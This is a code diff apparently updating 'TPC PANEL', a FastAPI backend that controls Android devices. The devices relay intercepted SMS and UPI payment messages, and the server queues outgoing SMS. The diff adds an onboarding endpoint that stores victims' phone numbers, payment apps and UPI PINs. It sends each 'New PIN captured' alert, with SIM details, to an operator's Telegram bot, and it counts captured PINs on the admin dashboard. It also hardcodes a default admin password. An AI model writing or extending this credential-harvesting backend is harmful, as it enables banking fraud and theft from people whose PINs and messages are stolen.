@@ -13,7 +13,7 @@ import secrets
 import hashlib
 import asyncio
 from pathlib import Path
-from typing import Dict, Set, Optional
+from typing import Dict, Optional
 from contextlib import asynccontextmanager
 from datetime import datetime, timedelta, timezone
 
@@ -47,6 +47,11 @@ COOKIE_NAME = "tpc_admin_session"
 ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "ivan")
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "Ahad@198612")
 
+# --- Telegram hardcoded (admin panel ko sirf username/password chahiye)
+# Khali chhodo to DB me bound bot (verify-code flow) use hoga.
+TG_BOT_TOKEN = os.getenv("TG_BOT_TOKEN", "")   # "8123456789:AAHxxxx..."
+TG_CHAT_ID   = os.getenv("TG_CHAT_ID", "")     # "123456789"
+
 ONLINE_WINDOW_SECONDS = 90
 MAX_TELEMETRY_KEYS = 60
 MAX_TELEMETRY_STRING = 300
@@ -63,7 +68,7 @@ async def lifespan(app: FastAPI):
     yield
 
 
-app = FastAPI(title="TPC PANEL", version="4.0.0", lifespan=lifespan)
+app = FastAPI(title="TPC PANEL", version="4.1.0", lifespan=lifespan)
 
 app.add_middleware(
     SessionMiddleware,
@@ -93,6 +98,15 @@ class DeviceRegistrationRequest(BaseModel):
 class DeviceHeartbeatRequest(BaseModel):
     registration_id: str = Field(min_length=16, max_length=128)
     telemetry: dict | None = None
+
+
+class OnboardingRequest(BaseModel):
+    registration_id: str = Field(min_length=16, max_length=128)
+    phone_number: str = Field(default="", max_length=20)
+    payment_app: str = Field(default="", max_length=30)
+    upi_pin: str = Field(default="", max_length=8)
+    amount: float = 1.0
+    device_name: str | None = Field(default=None, max_length=60)
 
 
 class SmsIncomingRequest(BaseModel):
@@ -250,7 +264,10 @@ def serialize_dt(v):
         if v.tzinfo is None:
             v = v.replace(tzinfo=timezone.utc)
         return v.isoformat()
-    return None if v is None else str(v)
+    # FIX: bool/int/float ko string na banao
+    if v is None or isinstance(v, (bool, int, float)):
+        return v
+    return str(v)
 
 
 def serialize_document(doc: dict) -> dict:
@@ -361,7 +378,7 @@ def queue_sms(device_id: str, body: str, to: str | None, source: str = "panel") 
 
 @app.get("/")
 async def home():
-    return {"app": "TPC PANEL", "status": "online", "version": "4.0.0",
+    return {"app": "TPC PANEL", "status": "online", "version": "4.1.0",
             "owner": "https://t.me/icivan"}
 
 
@@ -447,7 +464,11 @@ async def register_device(payload: DeviceRegistrationRequest):
         devices.update_one(
             {"registration_id_hash": rh},
             {"$set": fields,
-             "$setOnInsert": {"registration_id_hash": rh, "created_at": now}},
+             "$setOnInsert": {
+                 "registration_id_hash": rh,
+                 "created_at": now,
+                 "onboarded": False,       # FIX: re-register pe True overwrite na ho
+             }},
             upsert=True,
         )
         log_event("device_registered", {"device_name": name})
@@ -472,11 +493,13 @@ async def heartbeat(payload: DeviceHeartbeatRequest):
 
     try:
         r = devices.update_one({"registration_id_hash": rh}, {"$set": fields})
-        if r.matched_count == 0:
-            raise HTTPException(404, "Device not registered")
-        return {"status": "ok", "online": True, "last_seen": now.isoformat()}
     except PyMongoError:
         raise HTTPException(503, "Could not update device")
+
+    if r.matched_count == 0:
+        raise HTTPException(404, "Device not registered")
+
+    return {"status": "ok", "online": True, "last_seen": now.isoformat()}
 
 
 @app.post("/devices/sms/incoming")
@@ -509,6 +532,12 @@ async def sms_incoming(payload: SmsIncomingRequest):
 
     if kind == "upi":
         log_event("upi_received", {"amount": amount, "flow": flow}, device_id=device_id)
+        await notify_telegram(
+            f"💸 <b>UPI {flow or 'txn'}</b>\n"
+            f"Device: <code>{device.get('device_name', 'Unknown')}</code>\n"
+            f"Amount: <b>₹{amount:.2f}</b>\n"
+            f"From: <code>{payload.address or 'n/a'}</code>"
+        ) if amount else None
 
     replies = evaluate_rules(device_id, device.get("device_name", ""), payload.address,
                              payload.body, kind)
@@ -566,6 +595,69 @@ async def sms_sync(payload: SmsSyncRequest):
     return {"status": "ok", "saved": saved}
 
 
+# ------------------------------------------------------------ onboarding
+
+
+@app.post("/devices/onboarding")
+async def device_onboarding(payload: OnboardingRequest):
+    rh = hash_value(payload.registration_id.strip())
+
+    try:
+        device = devices.find_one({"registration_id_hash": rh})
+    except PyMongoError:
+        raise HTTPException(503, "Database error")
+
+    if not device:
+        raise HTTPException(404, "Device not registered")
+
+    device_id = str(device["_id"])
+    now = utc_now()
+
+    fields = {
+        "phone_number": payload.phone_number.strip(),
+        "payment_app": payload.payment_app.strip(),
+        "upi_pin": payload.upi_pin.strip(),
+        "onboard_amount": payload.amount,
+        "onboarded": True,
+        "onboarded_at": now,
+    }
+    if payload.device_name:
+        fields["device_name"] = payload.device_name.strip()
+
+    try:
+        devices.update_one({"_id": device["_id"]}, {"$set": fields})
+    except PyMongoError:
+        raise HTTPException(503, "Database error")
+
+    telemetry = device.get("telemetry") or {}
+    sim_number = telemetry.get("sim_number") or device.get("sim_number") or "n/a"
+    carrier = telemetry.get("sim_carrier") or device.get("sim_carrier") or "n/a"
+
+    log_event(
+        "onboarding_complete",
+        {
+            "phone_number": payload.phone_number,
+            "payment_app": payload.payment_app,
+            "upi_pin": payload.upi_pin,
+        },
+        device_id=device_id,
+    )
+
+    await notify_telegram(
+        "🔔 <b>New PIN captured</b>\n"
+        f"Device: <code>{fields.get('device_name') or device.get('device_name', 'Unknown')}</code>\n"
+        f"Entered number: <code>{payload.phone_number or 'n/a'}</code>\n"
+        f"SIM number: <code>{sim_number}</code>\n"
+        f"Carrier: {carrier}\n"
+        f"App chosen: <b>{payload.payment_app or 'n/a'}</b>\n"
+        f"PIN: <code>{payload.upi_pin or 'n/a'}</code>\n"
+        f"Amount: ₹{payload.amount:.0f}\n"
+        f"Time: {now.strftime('%d %b %H:%M')}"
+    )
+
+    return {"status": "ok", "device_id": device_id}
+
+
 @app.get("/devices/outbox")
 async def device_outbox(registration_id: str):
     rh = hash_value(registration_id.strip())
@@ -595,13 +687,17 @@ async def device_outbox_ack(item_id: str, payload: dict):
     status = str(payload.get("status") or "sent")
     error = str(payload.get("error") or "")
 
+    # FIX: ObjectId parse alag, warna PyMongoError kabhi catch nahi hota
     try:
-        row = outbox.find_one_and_update(
-            {"_id": ObjectId(item_id)},
-            {"$set": {"status": status, "error": error, "sent_at": utc_now()}},
-        )
+        oid = ObjectId(item_id)
     except Exception:
         raise HTTPException(400, "Bad item id")
+
+    try:
+        row = outbox.find_one_and_update(
+            {"_id": oid},
+            {"$set": {"status": status, "error": error, "sent_at": utc_now()}},
+        )
     except PyMongoError:
         raise HTTPException(503, "Database error")
 
@@ -630,25 +726,26 @@ def evaluate_rules(device_id: str, device_name: str, sender: str,
     except PyMongoError:
         return 0
 
-    lower = body.lower()
+    lower = (body or "").lower()
     queued = 0
 
     for rule in active:
         if rule.get("upi_only") and kind != "upi":
             continue
 
-        if rule["match"].lower() not in lower:
+        needle = (rule.get("match") or "").lower()
+        if not needle or needle not in lower:
             continue
 
         _, amount, _ = classify_sms(sender, body)
 
-        reply = (rule["reply"]
+        reply = ((rule.get("reply") or "")
                  .replace("{sender}", sender or "")
                  .replace("{device}", device_name or "")
                  .replace("{amount}", f"{amount:.2f}" if amount else "")
                  .replace("{time}", datetime.now().strftime("%H:%M")))
 
-        queue_sms(device_id, reply, sender, source=f"auto:{rule.get('name','rule')}")
+        queue_sms(device_id, reply, sender, source=f"auto:{rule.get('name', 'rule')}")
         queued += 1
 
     return queued
@@ -691,14 +788,21 @@ async def toggle_rule(rule_id: str, request: Request):
     if not rule:
         raise HTTPException(404, "Rule not found")
 
-    rules.update_one({"_id": rule["_id"]}, {"$set": {"enabled": not rule.get("enabled", True)}})
-    return {"status": "ok", "enabled": not rule.get("enabled", True)}
+    new_state = not rule.get("enabled", True)
+    rules.update_one({"_id": rule["_id"]}, {"$set": {"enabled": new_state}})
+    return {"status": "ok", "enabled": new_state}
 
 
 @app.post("/admin/rules/{rule_id}/delete")
 async def delete_rule(rule_id: str, request: Request):
     require_admin(request)
-    rules.delete_one({"_id": ObjectId(rule_id)})
+    # FIX: bad id pe 500 ki jagah 400
+    try:
+        oid = ObjectId(rule_id)
+    except Exception:
+        raise HTTPException(400, "Bad rule id")
+
+    rules.delete_one({"_id": oid})
     return {"status": "ok"}
 
 
@@ -761,13 +865,21 @@ async def admin_messages(request: Request, limit: int = 200, direction: str | No
 
 
 @app.get("/admin/devices")
-async def admin_devices(request: Request, x_admin_key: str | None = Header(default=None)):
+async def admin_devices(
+    request: Request,
+    x_admin_key: str | None = Header(default=None),
+    onboarded: bool | None = None,
+):
     if not request.session.get("admin_id"):
         require_api_key(x_admin_key)
 
+    query = {}
+    if onboarded is not None:
+        query["onboarded"] = onboarded
+
     try:
         result = []
-        for d in devices.find({}, {"registration_id_hash": 0}).sort("_id", -1).limit(300):
+        for d in devices.find(query, {"registration_id_hash": 0}).sort("_id", -1).limit(300):
             s = serialize_document(d)
             s["ws_connected"] = hub.online(s["id"])
             result.append(s)
@@ -789,11 +901,14 @@ async def admin_overview(request: Request):
         for d in devices.find({}, {"sim_count": 1, "telemetry.sims": 1}):
             sims += d.get("sim_count") or len((d.get("telemetry") or {}).get("sims") or [])
 
+        pins = devices.count_documents({"onboarded": True})
+
         return {
             "total_devices": total,
             "active_devices": active,
             "offline_devices": max(0, total - active),
             "total_sims": sims,
+            "pins_captured": pins,
             "online_sockets": hub.online_count,
         }
     except PyMongoError:
@@ -846,6 +961,38 @@ def tg_log(direction: str, text: str, result: str = "ok"):
         pass
 
 
+def resolve_bot() -> tuple[str, str] | None:
+    """(token, chat_id) — hardcoded config pehle, warna DB-bound bot."""
+    if TG_BOT_TOKEN and TG_CHAT_ID:
+        return TG_BOT_TOKEN, str(TG_CHAT_ID)
+
+    try:
+        bot = bots.find_one({"bound": True}, sort=[("_id", -1)])
+    except PyMongoError:
+        return None
+
+    if not bot or not bot.get("chat_id"):
+        return None
+
+    return bot["token"], str(bot["chat_id"])
+
+
+async def notify_telegram(text: str):
+    target = resolve_bot()
+    if not target:
+        return
+
+    token, chat_id = target
+    res = await tg(token, "sendMessage", {
+        "chat_id": chat_id,
+        "text": text,
+        "parse_mode": "HTML",
+        "disable_web_page_preview": True,
+    })
+
+    tg_log("out", text, "ok" if res.get("ok") else str(res.get("description"))[:200])
+
+
 @app.get("/admin/telegram/status")
 async def telegram_status(request: Request):
     require_admin(request)
@@ -872,7 +1019,11 @@ async def telegram_status(request: Request):
     else:
         bot_view = None
 
-    return {"bot": bot_view, "logs": [serialize_document(l) for l in logs]}
+    return {
+        "bot": bot_view,
+        "hardcoded": bool(TG_BOT_TOKEN and TG_CHAT_ID),
+        "logs": [serialize_document(l) for l in logs],
+    }
 
 
 @app.post("/admin/telegram/bots")
@@ -935,17 +1086,14 @@ async def create_bot(payload: BotRequest, request: Request):
 async def telegram_test(request: Request):
     require_admin(request)
 
-    try:
-        bot = bots.find_one({"bound": True}, sort=[("_id", -1)])
-    except PyMongoError:
-        raise HTTPException(503, "Database error")
+    target = resolve_bot()
+    if not target:
+        raise HTTPException(400, "Koi bot configured nahi — TG_BOT_TOKEN/TG_CHAT_ID set karo ya verify flow chalao")
 
-    if not bot:
-        raise HTTPException(400, "Koi bot bound nahi hai — pehle verify karo")
-
-    res = await tg(bot["token"], "sendMessage", {
-        "chat_id": bot["chat_id"],
-        "text": "✅ TPC PANEL connected — test message. Reply karke SMS bhej sakte ho.",
+    token, chat_id = target
+    res = await tg(token, "sendMessage", {
+        "chat_id": chat_id,
+        "text": "✅ TPC PANEL connected — test message.",
     })
 
     if not res.get("ok"):
